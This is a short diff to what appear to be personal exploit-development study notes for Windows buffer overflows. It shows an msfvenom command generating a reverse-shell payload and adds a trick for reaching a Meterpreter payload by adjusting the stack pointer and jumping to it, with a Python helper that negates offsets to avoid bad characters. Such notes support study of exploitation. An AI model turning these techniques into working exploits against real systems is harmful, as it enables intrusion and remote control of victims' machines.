@@ -8,6 +8,22 @@ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread
 .load narly
 !nmod
 ============
+if you have to do a long jump to your meterpreter+shikata ganai payload, better not to do a negative long jump to the payload
+instead:
+change stack pointer and jmp esp
+
+if you want to go back 
+sub esp, number
+but in a case you have bad chars, encode number to a negative one
+
+def negate(target):
+  return (0x100000000 - target) & 0xFFFFFFFF
+
+and change sub to add
+
+add esp, negate(jump_offset)
+jmp esp
+============
 negative jump example
 
 nasm > jmp $-0x8fc
